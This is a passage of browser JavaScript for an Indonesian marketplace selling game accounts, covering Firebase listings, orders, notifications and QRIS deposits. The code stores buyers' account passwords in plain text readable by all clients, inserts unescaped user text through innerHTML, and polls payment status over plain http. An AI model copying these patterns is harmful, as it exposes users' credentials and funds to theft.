            db2 = firebase.database();
        } else {
            // Jika app default sudah dipakai, inisialisasi app sekunder khusus untuk DB Store
            const secondaryApp = firebase.initializeApp(firebaseConfig2, "SecondaryCubeStore");
            db2 = secondaryApp.database();
        }
        console.log("Firebase DB2 Terhubung Sempurna.");
    } else {
        console.error("SDK Firebase belum dimuat!");
    }
} catch (e) {
    console.error("Gagal menginisialisasi Firebase DB2:", e);
}
// ==========================================================================
// LOGIKA UTAMA: ENGINE KUSTOM CUBE STORE & GLOBAL LIVE NOTIFICATION
// ==========================================================================

// ==========================================================================
// LOGIKA UTAMA: ENGINE KUSTOM CUBE STORE & GLOBAL LIVE NOTIFICATION (DB2 VERSION)
// ==========================================================================

// Variabel Penahan Sesi Belanja Sementara
let selectedProductStoreId = null;
let liveProductStoreCache = {};

// Fungsi Navigasi View Iklan
function openFormJualStore() {
    document.getElementById('store-main-view').style.display = 'none';
    document.getElementById('store-jual-form').style.display = 'block';
}

function closeFormJualStore() {
    document.getElementById('store-main-view').style.display = 'block';
    document.getElementById('store-jual-form').style.display = 'none';
}

function closeCheckoutStore() {
    document.getElementById('store-main-view').style.display = 'block';
    document.getElementById('store-beli-checkout').style.display = 'none';
    selectedProductStoreId = null;
}

// Handler Perubahan Kolom Pembayaran Penjual
function updateStorePaymentFields() {
    const type = document.getElementById('st-jual-payment-type').value;
    document.getElementById('st-jual-field-wallet').style.display = (type === 'dana') ? 'block' : 'none';
    document.getElementById('st-jual-field-qris').style.display = (type === 'qris') ? 'block' : 'none';
}

// ==========================================================================
// VERSI TERBARU: SUBMIT PRODUCT STORE DENGAN KOMPRESOR GAMBAR OTOMATIS (CEPAT & RINGAN)
// ==========================================================================
function submitProductStore() {
    const title = document.getElementById('st-jual-title').value.trim();
    const price = document.getElementById('st-jual-price').value.trim();
    const strike = document.getElementById('st-jual-strike').value.trim();
    const desc = document.getElementById('st-jual-desc').value.trim();
    const secureUser = document.getElementById('st-jual-secure-user').value.trim();
    const securePass = document.getElementById('st-jual-secure-pass').value.trim();
    const paymentType = document.getElementById('st-jual-payment-type').value;
    const paymentDetail = document.getElementById('st-jual-payment-detail').value.trim();
    
    const photoFile = document.getElementById('st-jual-photo').files[0];
    const qrisFile = document.getElementById('st-jual-qris-file').files[0];

    // 1. Validasi teks kosong
    if(!title || !price || !desc || !secureUser || !securePass) {
        return ErenAlert.error("Gagal!", "Mohon lengkapi Detail Produk & Data Serah Terima Akun!");
    }
    if(!photoFile) {
        return ErenAlert.error("Gagal!", "Harap upload foto spesifikasi isi akun game!");
    }
    if(paymentType === 'dana' && !paymentDetail) {
        return ErenAlert.error("Gagal!", "Harap isi No. Rekening / No. DANA tujuan transfer uang!");
    }
    if(paymentType === 'qris' && !qrisFile) {
        return ErenAlert.error("Gagal!", "Harap upload lampiran gambar file QRIS Anda!");
    }

    ErenAlert.loading("Mengompres & mendaftarkan produk...");

    // Helper Engine: Mengompres Gambar Otomatis Menggunakan Canvas HTML5
    const compressImageEngine = (file) => {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = (event) => {
                const img = new Image();
                img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    // Setel batas resolusi maksimal (misal lebar maks 800px, tinggi proporsional)
                    const MAX_WIDTH = 800;
                    let width = img.width;
                    let height = img.height;

                    if (width > MAX_WIDTH) {
                        height *= MAX_WIDTH / width;
                        width = MAX_WIDTH;
                    }

                    canvas.width = width;
                    canvas.height = height;
                    ctx.drawImage(img, 0, 0, width, height);
                    
                    // Kompres kualitas gambar menjadi 60% (0.6) agar file sangat kecil & ringan
                    const compressedBase64 = canvas.toDataURL('image/jpeg', 0.6);
                    resolve(compressedBase64);
                };
            };
        });
    };

    // 2. Jalankan kompresi gambar secara paralel sebelum dikirim ke Firebase (db2)
    const processPhoto = compressImageEngine(photoFile);
    const processQris = (paymentType === 'qris' && qrisFile) ? compressImageEngine(qrisFile) : Promise.resolve("");

    Promise.all([processPhoto, processQris]).then(([compressedPhoto, compressedQris]) => {
        const productData = {
            title: title,
            price: parseInt(price),
            strike: strike ? parseInt(strike) : "",
            desc: desc,
            photo: compressedPhoto, // Menggunakan hasil kompresi yang super ringan
            secureUser: secureUser,
            securePass: securePass,
            paymentType: paymentType,
            paymentDetail: paymentDetail,
            qrisData: compressedQris, // Menggunakan hasil kompresi
            seller: currentUser,
            timestamp: Date.now()
        };

        // Kirim data ke database barumu (db2)
        db2.ref("cube_store/products").push(productData, function(error) {
            Swal.close(); // Tutup loading spinner
            if(error) {
                ErenAlert.error("Sistem Error", "Gagal menyimpan iklan ke cloud.");
            } else {
                ErenAlert.success("Berhasil!", "Produk digital Anda resmi dipasarkan.");
                
                // Reset semua kolom input form
                document.getElementById('st-jual-title').value = "";
                document.getElementById('st-jual-price').value = "";
                document.getElementById('st-jual-strike').value = "";
                document.getElementById('st-jual-desc').value = "";
                document.getElementById('st-jual-secure-user').value = "";
                document.getElementById('st-jual-secure-pass').value = "";
                document.getElementById('st-jual-payment-detail').value = "";
                document.getElementById('st-jual-photo').value = "";
                if(document.getElementById('st-jual-qris-file')) document.getElementById('st-jual-qris-file').value = "";
                closeFormJualStore();
            }
        });
    }).catch((err) => {
        Swal.close();
        ErenAlert.error("Gagal", "Terjadi kesalahan saat memproses gambar.");
        console.error(err);
    });
}
function listenStoreCatalog() {
    db2.ref("cube_store/products").on("value", function(snapshot) {
        const grid = document.getElementById('store-product-grid');
        if(!grid) return;
        grid.innerHTML = "";
        liveProductStoreCache = {};

        if(!snapshot.exists()) {
            grid.innerHTML = `<p style="grid-column: 1/-1; text-align:center; opacity:0.4; font-size:0.9rem; padding:40px 0;">Belum ada produk digital yang dipasang iklan.</p>`;
            return;
        }

        // Mengambil data user yang sedang aktif login dari sistem Anda
        const loggedInUser = localStorage.getItem('activeUser') || currentUser || "";

        snapshot.forEach(child => {
            const id = child.key;
            const data = child.val();
            liveProductStoreCache[id] = data; 

            const textStrike = data.strike ? `<span style="text-decoration:line-through; opacity:0.5; font-size:0.8rem; margin-left:8px;">Rp ${parseInt(data.strike).toLocaleString('id-ID')}</span>` : '';
            
            // Cek apakah produk ini milik user yang sedang login
            const isMyProduct = (loggedInUser && data.seller && loggedInUser.toLowerCase() === data.seller.toLowerCase());

            const card = document.createElement('div');
            card.className = "glass-card";
            card.style.cssText = "padding: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: 0.3s;";
            
            card.innerHTML = `
                <div style="background-image: url('${data.photo || ''}'); background-size: cover; background-position: center; height: 140px; border-radius: 8px; margin-bottom: 10px; position: relative;">
                    <span style="position: absolute; top: 8px; left: 8px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 6px; font-size: 0.75rem; color: #00f2ea; font-family: 'Orbitron'; border: 1px solid #00f2ea;">
                        <i class="fa-solid fa-user"></i> ${data.seller.toUpperCase()}
                    </span>
                </div>
                <h4 style="margin: 5px 0; font-family: 'Rajdhani'; font-weight: bold; font-size: 1.1rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${data.title}</h4>
                <div style="margin-bottom: 10px;">
                    <span style="color: #00f2ea; font-family: 'Orbitron'; font-weight: bold;">Rp ${parseInt(data.price).toLocaleString('id-ID')}</span>
                    ${textStrike}
                </div>
                <button class="btn-primary" style="width: 100%; font-size: 0.8rem; padding: 8px; background: ${isMyProduct ? '#24000b' : '#00f2ea'}; color: ${isMyProduct ? '#ff0055' : '#000'}; border: ${isMyProduct ? '1px solid #ff0055' : 'none'};">
                    <i class="fa-solid ${isMyProduct ? 'fa-screwdriver-wrench' : 'fa-shopping-cart'}"></i> 
                    ${isMyProduct ? 'KELOLA IKLAN SAYA' : 'BELI PRODUK'}
                </button>
            `;

            card.onclick = function() {
                openDetailStore(id);
            };

            grid.appendChild(card);
        });
    });
}
// Fungsi Membuka Invoice Checkout Pembayaran untuk Pembeli
function checkoutProductStore(productId) {
    const data = liveProductStoreCache[productId];
    if(!data) return;

    if(data.seller.toLowerCase() === currentUser.toLowerCase()) {
        return ErenAlert.error("Akses Ditolak", "Anda tidak bisa membeli produk digital milik Anda sendiri!");
    }

    selectedProductStoreId = productId;
    
    document.getElementById('store-main-view').style.display = 'none';
    document.getElementById('store-beli-checkout').style.display = 'block';

    // Pengisian Data Teks Invoice Komponen Pembayaran
    document.getElementById('checkout-prod-title').innerText = data.title;
    document.getElementById('checkout-prod-price').innerText = "Rp " + parseInt(data.price).toLocaleString('id-ID');
    document.getElementById('checkout-prod-seller').innerText = data.seller.toUpperCase();

    // Penyaringan Alur Penampilan Tujuan Transfer Rekening vs QRIS Penjual
    if(data.paymentType === 'dana') {
        document.getElementById('checkout-pay-wallet-box').style.display = 'block';
        document.getElementById('checkout-pay-qris-box').style.display = 'none';
        document.getElementById('checkout-pay-detail').innerText = data.paymentDetail;
    } else {
        document.getElementById('checkout-pay-wallet-box').style.display = 'none';
        document.getElementById('checkout-pay-qris-box').style.display = 'block';
        document.getElementById('checkout-pay-qris-img').src = data.qrisData;
    }
    document.getElementById('checkout-pay-proof').value = ""; // Reset File Input Bukti Transfer
}

// Fungsi Mengirim Bukti Pembayaran untuk Diproses oleh Penjual via db2
function confirmPaymentStore() {
    const proofFile = document.getElementById('checkout-pay-proof').files[0];
    if(!proofFile) {
        return ErenAlert.error("Gagal!", "Harap lampirkan gambar bukti transfer pembayarannya!");
    }

    ErenAlert.loading("Mengirim bukti pembayaran ke penjual...");
    const reader = new FileReader();
    
    reader.onload = function(e) {
        const base64Proof = e.target.result;
        const prodData = liveProductStoreCache[selectedProductStoreId];

        const orderData = {
            productId: selectedProductStoreId,
            productTitle: prodData.title,
            price: prodData.price,
            buyer: currentUser,
            seller: prodData.seller,
            proofImage: base64Proof,
            secureUser: prodData.secureUser,
            securePass: prodData.securePass,
            status: "pending",
            timestamp: Date.now()
        };

        // Buat Baris Data Transaksi Baru di Database via db2
        db2.ref("cube_store/orders").push(orderData, function(error) {
            Swal.close();
            if(error) {
                ErenAlert.error("Gagal", "Terjadi kegagalan komunikasi jaringan internet.");
            } else {
                // Kirim Notifikasi Instan ke Akun Penjual
                sendNotificationLive(prodData.seller, `🔔 Ada yang membeli produk Anda! "${prodData.title}" seharga Rp ${parseInt(prodData.price).toLocaleString('id-ID')}. Mohon segera periksa bukti transfer dan konfirmasi data akun!`, "process");
                
                ErenAlert.success("Sukses Terkirim!", "Bukti berhasil dikirim. Tunggu penjual memeriksa & melakukan konfirmasi.");
                closeCheckoutStore();
            }
        });
    };
    reader.readAsDataURL(proofFile);
}

// Fungsi Pemantauan Order Masuk Khusus Penjual via db2
function listenIncomingOrdersPenjual() {
    db2.ref("cube_store/orders").on("value", function(snapshot) {
        const containerBox = document.getElementById('penjual-order-box');
        const listContainer = document.getElementById('penjual-order-list');
        if(!listContainer || !containerBox) return;

        listContainer.innerHTML = "";
        let countOrdersIncoming = 0;

        if(snapshot.exists()) {
            snapshot.forEach(child => {
                const orderId = child.key;
                const data = child.val();

                // Validasi data filter: Hanya tampilkan jika pesanan ini ditujukan untuk user yang sedang login & statusnya pending
                if(data.seller.toLowerCase() === currentUser.toLowerCase() && data.status === 'pending') {
                    countOrdersIncoming++;
                    
                    listContainer.innerHTML += `
                        <div class="glass-card" style="border: 1px solid #ffaa00; background: rgba(0,0,0,0.7); line-height: 1.6; margin-bottom: 15px;">
                            <p style="margin: 5px 0; font-weight: bold; color: #ffaa00;"><i class="fa-solid fa-triangle-exclamation"></i> PRODUK DI-ORDER OLEH USER: ${data.buyer.toUpperCase()}</p>
                            <p style="margin: 5px 0;">📦 <b>Nama Produk:</b> ${data.productTitle}</p>
                            <p style="margin: 5px 0;">💰 <b>Harga Uang:</b> Rp ${parseInt(data.price).toLocaleString('id-ID')}</p>
                            <div style="margin: 12px 0;">
                                <p style="margin-bottom: 5px; font-size: 0.85rem;">📸 <b>Bukti Transfer Pembeli:</b> (Klik Gambar untuk Memperbesar)</p>
                                <img src="${data.proofImage}" style="max-width: 150px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2); cursor: pointer;" onclick="window.open('${data.proofImage}', '_blank')">
                            </div>
                            <div style="display: flex; gap: 10px; margin-top: 15px;">
                                <button onclick="processActionOrderStore('${orderId}', 'confirm')" style="flex: 1; background: #0f0; color: black; border: none; padding: 10px; font-weight: bold; border-radius: 8px; cursor: pointer; font-family:'Orbitron';"><i class="fa-solid fa-circle-check"></i> CONFIRM</button>
                                <button onclick="processActionOrderStore('${orderId}', 'reject')" style="flex: 1; background: #ff4444; color: white; border: none; padding: 10px; font-weight: bold; border-radius: 8px; cursor: pointer; font-family:'Orbitron';"><i class="fa-solid fa-circle-xmark"></i> TOLAK</button>
                            </div>
                        </div>
                    `;
                }
            });
        }

        // Tampilkan kotak pesanan jika ada antrean transaksi masuk
        containerBox.style.display = (countOrdersIncoming > 0) ? 'block' : 'none';
    });
}

// Fungsi Eksekusi Penjual: Konfirmasi Pengiriman Akun Otomatis atau Penolakan via db2
function processActionOrderStore(orderId, actionType) {
    db2.ref("cube_store/orders/" + orderId).once("value", function(snapshot) {
        if(!snapshot.exists()) return;
        const order = snapshot.val();

        if(actionType === 'confirm') {
            ErenAlert.loading("Memproses konfirmasi penjualan...");
            
            // 1. Update status order menjadi success di database via db2
            db2.ref("cube_store/orders/" + orderId + "/status").set("success").then(() => {
                
                // 2. Kirim notifikasi berisi serah terima akun otomatis ke pembeli
                const msgNotifBuyer = `🎁 Pembayaran Anda untuk produk "${order.productTitle}" telah dikonfirmasi penjual! Berikut data akses serah terima akun Anda:\n🔑 USERNAME: ${order.secureUser}\n🔑 PASSWORD: ${order.securePass}\n*Harap segera amankan akun Anda!`;
                sendNotificationLive(order.buyer, msgNotifBuyer, "success");

                // 3. Hapus produk dari daftar etalase penjualan karena sudah laku terjual
                if(order.productId) {
                    db2.ref("cube_store/products/" + order.productId).remove();
                }

                Swal.close();
                ErenAlert.success("Selesai!", "Transaksi berhasil dikonfirmasi. Akun otomatis dikirimkan ke pembeli.");
            });

        } else if(actionType === 'reject') {
            Swal.fire({
                title: 'Tolak Pembayaran?',
                text: "Berikan alasan mengapa pembayaran ini ditolak:",
                input: 'text',
                inputPlaceholder: 'Contoh: Bukti transfer terdeteksi palsu / edit...',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#ff4444',
                confirmButtonText: 'Ya, Tolak',
                background: '#111b21',
                color: '#fff'
            }).then((res) => {
                if(res.isConfirmed) {
                    const reasonReject = res.value ? res.value.trim() : "Pembayaran palsu atau kurang";
                    ErenAlert.loading("Menolak transaksi...");

                    // Update status order menjadi rejected di database via db2
                    db2.ref("cube_store/orders/" + orderId + "/status").set("rejected").then(() => {
                        
                        // Kirim notifikasi peringatan pembatalan kepada pembeli
                        const msgNotifBuyer = `⚠️ Maaf, pesanan Anda untuk produk "${order.productTitle}" ditolak oleh penjual. Alasan penolakan: ${reasonReject}.`;
                        sendNotificationLive(order.buyer, msgNotifBuyer, "error");

                        Swal.close();
                        ErenAlert.success("Ditolak", "Pesanan berhasil ditolak & pembeli mendapatkan notifikasi peringatan.");
                    });
                }
            });
        }
    });
}

// ==========================================================================
// CENTRAL ENGINE NOTIFIKASI LIVE CLOUD CORE VIA DB2
// ==========================================================================

// Fungsi Pengiriman Notifikasi Masuk ke Simpul Database via db2
function sendNotificationLive(targetUser, messageText, typeStyle = "info") {
    let styleColor = "#00f2ea"; // Default Info Cyan Glow
    if(typeStyle === "success") styleColor = "#00ff00";
    if(typeStyle === "process") styleColor = "#ffaa00";
    if(typeStyle === "error") styleColor = "#ff3b30";

    const notifObject = {
        message: messageText,
        color: styleColor,
        isRead: false,
        timestamp: Date.now()
    };

    db2.ref("cube_notifications/" + targetUser.toLowerCase()).push(notifObject);
}

// Fungsi Listener Mendengarkan Notifikasi Masuk via db2
function listenLiveUserNotifications() {
    db2.ref("cube_notifications/" + currentUser.toLowerCase()).on("value", function(snapshot) {
        const badge = document.getElementById('nav-notif-badge');
        const listPageContainer = document.getElementById('notification-box-list');
        
        if(!badge) return;
        let countUnread = 0;

        if(!snapshot.exists()) {
            badge.style.display = 'none';
            if(listPageContainer) {
                listPageContainer.innerHTML = `<p style="text-align:center; opacity:0.4; font-size:0.9rem; padding:40px 0;">Kotak pesan masuk kosong. Belum ada pemberitahuan sistem.</p>`;
            }
            return;
        }

        if(listPageContainer) listPageContainer.innerHTML = "";

        // Urutkan objek data array agar yang terbaru paling atas
        let notifArray = [];
        snapshot.forEach(child => {
            const data = child.val();
            if(!data.isRead) countUnread++;
            notifArray.push({ id: child.key, ...data });
        });

        // Tampilkan Angka Indikator Badge Notifikasi Kecil di Sidebar
        if(countUnread > 0) {
            badge.innerText = countUnread;
            badge.style.display = 'block';
        } else {
            badge.style.display = 'none';
        }

        // Render Isian Item ke Dalam Menu Notifikasi Utama
        notifArray.reverse().forEach(item => {
            if(listPageContainer) {
                listPageContainer.innerHTML += `
                    <div class="notif-item-card" style="border-left-color: ${item.color}; background: ${item.isRead ? 'rgba(255,255,255,0.01)' : 'rgba(255,255,255,0.05)'}">
                        <div style="font-size:0.95rem; color:#fff; white-space: pre-line; text-align: left; line-height: 1.5;">${item.message}</div>
                        <div style="font-size:0.7rem; color:#666; margin-top:8px; font-family:'Orbitron'; text-align: right;">${new Date(item.timestamp).toLocaleString('id-ID')}</div>
                    </div>
                `;
            }
        });
    });
}

// Fungsi Menghapus Seluruh Log Notifikasi Masuk Pengguna via db2
function clearAllNotifications() {
    db2.ref("cube_notifications/" + currentUser.toLowerCase()).remove(() => {
        ErenAlert.success("Bersih!", "Semua riwayat pemberitahuan sistem Anda berhasil dihapus.");
    });
}

// Fungsi Menandai Semua Notifikasi Telah Dibaca via db2
function markAllNotificationsAsRead() {
    db2.ref("cube_notifications/" + currentUser.toLowerCase()).once("value", function(snapshot) {
        if(snapshot.exists()) {
            snapshot.forEach(child => {
                if(!child.val().isRead) {
                    db2.ref("cube_notifications/" + currentUser.toLowerCase() + "/" + child.key + "/isRead").set(true);
                }
            });
        }
    });
}

// ==========================================================================
// KUNCI HOOK SYSTEM OVERRIDE AUTOMATION AT LOADING STARTUP
// ==========================================================================

// Interseptor atau Pengait fungsi lama saat login user sukses terverifikasi
const baseVideoOnEndedHook = video.onended;
// ==========================================================================
// KUNCI HOOK SYSTEM OVERRIDE AUTOMATION AT LOADING STARTUP (FIX STUCK LOGIN)
// ==========================================================================

// Interseptor saat video intro loading github selesai berputar
video.onended = function() {
    // Pastikan layar login mati total dan tidak menginterupsi dashboard
    document.getElementById('screen-login').classList.remove('active');
    document.getElementById('screen-login').style.display = 'none';
    
    // Tampilkan dashboard utama
    document.getElementById('video-loading').style.display = 'none';
    document.getElementById('screen-dashboard').style.display = 'block';
    document.getElementById('top-bar').style.display = 'flex';
    
    // Aktifkan Trigger Mesin Sinkronisasi Pasar Digital & Notifikasi Realtime Cloud via db2
    if (currentUser && db2) {
        listenStoreCatalog();
        listenIncomingOrdersPenjual();
        listenLiveUserNotifications();
    }
};

// Pengait pemulihan sesi login (auto-login saat browser di-refresh ulang)
const baseWindowLoadHook = window.onload;
window.onload = function() {
    if(typeof baseWindowLoadHook === 'function') baseWindowLoadHook();
    
    const status = localStorage.getItem('isLoggedIn');
    const savedUser = localStorage.getItem('activeUser');

    if (status === 'true' && savedUser) {
        currentUser = savedUser;
        
        // Lewati layar login dan video loading, langsung panggil dashboard
        document.getElementById('screen-login').classList.remove('active');
        document.getElementById('screen-login').style.display = 'none';
        document.getElementById('video-loading').style.display = 'none';
        document.getElementById('screen-dashboard').style.display = 'block';
        document.getElementById('top-bar').style.display = 'flex';
        
        const dashUserElem = document.getElementById('display-user-dash');
        if (dashUserElem) dashUserElem.innerText = savedUser.toUpperCase();
        
        privateChatList = JSON.parse(localStorage.getItem('cube_chat_rooms_' + currentUser)) || [];
        if(typeof renderPrivateRooms === 'function') renderPrivateRooms();
        if (typeof listenMessages === 'function') listenMessages('global');
        if (typeof loadUserData === 'function') loadUserData(); 
        if (typeof loadHistory === 'function') loadHistory();
        
        setTimeout(() => {
            if (db2) {
                db2.ref("cube_users/" + currentUser + "/balance").once("value", function(snap) {
                    if(snap.exists() && typeof updateBalanceUI === 'function') updateBalanceUI(snap.val());
                });
                listenStoreCatalog();
                listenIncomingOrdersPenjual();
                listenLiveUserNotifications();
            }
        }, 800);
    }
};
// ==========================================================================
// FIX ENGINE DEPOSIT: GENERATE AUTOMATIC GATEWAY DENGAN AUTO-POLLING REALTIME
// ==========================================================================
function createDeposit() {
    const amountInput = document.getElementById('qris-amount');
    const amount = amountInput ? amountInput.value.trim() : "";
    
    if(!amount || parseInt(amount) < 1000) {
        return ErenAlert.error("Error!", "Minimal nominal Rp 1.000!");
    }
    
    ErenAlert.loading("Generating Dynamic QRIS...");
    
    // Tembak ke API Node.js Server menggunakan subdomain kamu
    fetch('http://pmlcube.mega-store.my.id:3000/api/generate-qris', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: currentUser,
            amount: parseInt(amount)
        })
    })
    .then(res => res.json())
    .then(data => {
        Swal.close();
        if(data.success) {
            // Masukkan baris ini di dalam blok sukses pemicu pembuatan QRIS topup
            addHubMutationLog("Request Top Up Saldo", amount, "TOPUP");
            
            // Tampilkan area gambar QRIS
            const qrisResultArea = document.getElementById('qris-result-area');
            const dynamicQrisImg = document.getElementById('dynamic-qris-img');
            if (qrisResultArea) qrisResultArea.style.display = 'block';
            if (dynamicQrisImg) dynamicQrisImg.src = data.qr_url;

            // --- TemanQRIS Widget Hook (Top Up) ---
            // Tujuan: memastikan tampilan pembayaran mengikuti widget temanqris.
            // Flow saldo tetap mengandalkan polling check-status (sudah ada dan terbukti).
            try {
                const widgetHost = document.getElementById('temanqris-widget-host') || document.createElement('div');
                if (!widgetHost.id) {
                    widgetHost.id = 'temanqris-widget-host';
                    widgetHost.style.marginTop = '12px';
                    widgetHost.style.display = 'flex';
                    widgetHost.style.justifyContent = 'center';
                }

                if (qrisResultArea && !document.getElementById('temanqris-widget-host')) {
                    qrisResultArea.appendChild(widgetHost);
                }

                // Jika widget sudah punya container, panggil render ulang.
                // Karena implementasi widget bisa berbeda versi, kita panggil secara aman.
                if (typeof window.temanQris === 'function') {
                    window.temanQris({
                        merchant: 'MQ455E285E85',
                        trx_id: data.trx_id || data.invoice_id || checkTrxId,
                        amount: parseInt(amount),
                        qr_url: data.qr_url
                    });
                } else if (typeof window.initTemanQris === 'function') {
                    window.initTemanQris({
                        merchant: 'MQ455E285E85',
                        trx_id: data.trx_id || data.invoice_id || checkTrxId,
                        amount: parseInt(amount),
                        qr_url: data.qr_url,
                        host: widgetHost
                    });
                }
            } catch (e) {
                console.warn('TemanQRIS widget tidak terinisialisasi, fallback polling jalan.', e);
            }

            // Tambahkan catatan ke riwayat kustom lokal halaman HTML
            if (typeof addHistory === 'function') {
                addHistory("Generate QRIS Rp " + parseInt(amount).toLocaleString('id-ID'), "PENDING", "status-process");
            }


            // ==================================================================
            // KUNCI PERBAIKAN: AUTO-POLLING CEK STATUS PEMBAYARAN (TIAP 4 DETIK)
            // ==================================================================
            // Gunakan ID unik transaksi dari data gateway (trx_id / invoice_id)
            const checkTrxId = data.trx_id || data.invoice_id; 
            let pollCounter = 0;
            const maxPolls = 75; // Batas polling maksimal 5 menit (75 x 4 detik)
            
            const depositInterval = setInterval(() => {
                pollCounter++;
                
                // Jika waktu tunggu habis (5 menit) dan belum dibayar, matikan interval
                if (pollCounter > maxPolls) {
                    clearInterval(depositInterval);
                    console.log("Waktu pembayaran QRIS telah kedaluwarsa.");
                    return;
                }

                // Cek status pembayaran ke API server backend
                fetch(`http://pmlcube.mega-store.my.id:3000/api/check-status?username=${currentUser}&trx_id=${checkTrxId}`)
                .then(res => res.json())
                .then(statusData => {
                    // Jika status dari API gateway menyatakan sukses / lunas / PAID
                    if (statusData.success && statusData.status === "PAID") {
                        clearInterval(depositInterval); // Stop pengecekan karena sudah lunas
                        
                        // Tarik saldo terbaru langsung dari Firebase DB2 agar UI ter-update
                        if (db2 && currentUser) {
                            db2.ref("cube_users/" + currentUser + "/balance").once("value", function(snap) {
                                if(snap.exists()) {
                                    const latestBalance = parseInt(snap.val() || 0);
                                    
                                    // 1. Simpan saldo terbaru ke LocalStorage biar anti-reset saat refresh
                                    localStorage.setItem('cube_balance', latestBalance);
                                    
                                    // 2. Tembak ke fungsi bawaan UI untuk update tampilan angka saldo global
                                    if (typeof updateBalanceUI === 'function') {
                                        updateBalanceUI(latestBalance);
                                    }
                                    
                                    // 3. Jangan update hub-live-balance di sini.
                                    //    Saldo hub akan di-handle oleh listener showSection('cubeqris-hub') agar tidak nyangkut ke tab lain.
                                    
                                }
                            });
                        }

                        // Berikan pop-up alert sukses yang menandakan saldo berhasil dikondisikan
                        Swal.fire({
                            title: 'Isi Saldo Sukses!',
                            text: `Dana sebesar Rp ${parseInt(amount).toLocaleString('id-ID')} telah berhasil ditambahkan ke akun Anda secara otomatis.`,
                            icon: 'success',
                            background: '#050505',
                            color: '#00f2ea',
                            confirmButtonColor: '#00f2ea'
                        });
                    }
                })
                .catch(err => console.error("Gagal melakukan status polling:", err));

            }, 4000); // 4000 ms = Cek ulang setiap 4 detik sekali

        } else {
            ErenAlert.error("Gagal Request", data.message || "Gagal mendapatkan enkripsi QRIS.");
        }
    })
    .catch(err => {
        Swal.close();
        console.error("QRIS Error:", err);
        ErenAlert.error("Koneksi Putus", "Gagal menghubungi server Node.js.");
    });
}

// ==========================================================================
// CENTRAL ROUTER: SINKRONISASI MENU DAN ENGINE HUB CUBEQRIS REALTIME
// ==========================================================================
// ==========================================================================
// CENTRAL ROUTER: SINKRONISASI MENU DAN ENGINE HUB CUBEQRIS REALTIME
// ==========================================================================
const baseShowSectionHook = showSection;
showSection = function(sectionId) {
    // Alihkan navigasi jika memicu ID gabungan baru
    let targetId = sectionId;
    if(sectionId === 'cubeqris-hub') {
        targetId = 'cubeqris-hub';
    }
    
    if(typeof baseShowSectionHook === 'function') baseShowSectionHook(targetId);
    
    if(sectionId === 'notifications') {
        if(typeof markAllNotificationsAsRead === 'function') markAllNotificationsAsRead();
    }

    // ==========================================================================
    // FIX ENGINE CUBEQRIS: MENGGUNAKAN LISTENER AKTIF (.on) ANTI-HILANG SAAT REFRESH
    // ==========================================================================
    if(sectionId === 'cubeqris-hub') {
        const qrContainer = document.getElementById('hub-static-qrcode');
        const ownerDisplay = document.getElementById('hub-qris-owner-name');
        const balanceDisplay = document.getElementById('hub-live-balance');
        
        if(ownerDisplay && currentUser) ownerDisplay.innerText = "@" + currentUser.toUpperCase();

        // Mengubah .once menjadi .on agar saldo tersinkronisasi secara terus-menerus (Real-time)
        if(balanceDisplay && db2 && currentUser) {
            db2.ref("cube_users/" + currentUser + "/balance").on("value", function(snap) {
                if(snap.exists()) {
                    const latestBalance = parseInt(snap.val() || 0);
                    
                    // 1. Tampilkan saldo terbaru ke tampilan UI QRIS Hub
                    balanceDisplay.innerText = "Rp " + latestBalance.toLocaleString('id-ID');
                    
                    // 2. Amankan juga ke dalam memori LocalStorage agar sinkron secara menyeluruh
                    localStorage.setItem('cube_balance', latestBalance);
                    
                    // 3. Update juga element saldo global lainnya jika tersedia di halaman utama
                    const sidebarBalanceView = document.getElementById('sidebar-user-balance');
                    const walletBalanceView = document.querySelector('.balance-amount');
                    if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + latestBalance.toLocaleString('id-ID');
                    if (walletBalanceView) walletBalanceView.innerText = "Rp " + latestBalance.toLocaleString('id-ID');
                }
            });
        }

        // Render QRIS Unik Pengguna Berdasarkan Username Aktif
        if(qrContainer && currentUser) {
            qrContainer.innerHTML = ""; // Bersihkan rendering lama
            const qrPayload = currentUser.toLowerCase();
            new QRCode(qrContainer, {
                text: qrPayload,
                width: 160,
                height: 160,
                colorDark : "#000000",
                colorLight : "#ffffff",
                correctLevel : QRCode.CorrectLevel.H
            });
        }
    }

    // KONTROL AUDIO BACKSOUND JEDAG JEDUG VIDEO BUG WA
    if(sectionId === 'bugwa') {
        const vBug = document.getElementById('videoBugWa');
        if(vBug) {
            vBug.muted = false;
            vBug.volume = 1.0;
            var playPromise = vBug.play();
            if (playPromise !== undefined) {
                playPromise.catch(err => console.log("Audio otomatis diblokir sistem browser."));
            }
        }
    } else {
        const menuUtamaLain = ['dashboard', 'store', 'history', 'notifications', 'settings', 'chat', 'admin', 'cubeqris-hub'];
        if (menuUtamaLain.includes(sectionId)) {
            const vBug = document.getElementById('videoBugWa');
            if(vBug) {
                vBug.muted = true;
                vBug.pause();
            }
        }
    }
};
function handleHubQRISDecode(event) {
    const file = event.target.files[0];
    if (!file) return;

    ErenAlert.loading("Membaca Enkripsi Data Gambar QRIS...");

    const reader = new FileReader();
    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0, img.width, img.height);
            
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            
            // Menggunakan library jsQR bawaan aplikasi Anda untuk membaca kode QR
            const code = jsQR(imageData.data, imageData.width, imageData.height, {
                inversionAttempts: "dontInvert",
            });

            Swal.close();

            // Memeriksa struktur kode QR resmi CUBE Anda
            if (code && code.data.startsWith("CUBEPAY_ID:")) {
                const detectedUser = code.data.split(":")[1];
                
                // ISI OTOMATIS: Kolom username target langsung terisi nama user hasil scan!
                const targetInput = document.getElementById('hub-tf-target');
                if (targetInput) {
                    targetInput.value = detectedUser;
                }
                
                Swal.fire({
